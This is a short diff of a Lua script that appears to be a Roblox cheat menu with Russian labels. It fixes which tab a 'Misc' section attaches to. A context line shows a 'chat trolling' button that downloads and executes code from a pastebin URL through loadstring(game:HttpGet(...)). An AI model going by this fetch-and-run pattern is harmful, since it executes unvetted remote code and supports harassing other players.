@@ -51,7 +51,7 @@ end)
 
 --Other NTSEC
 local Other = Window:NewTab("Разное")
-local OtherSection = Player:NewSection("Разное")
+local OtherSection = Other:NewSection("Разное")
 --B1.3
 OtherSection:NewButton("Троллинг в чате", "Довольно весело :)", function()
     loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
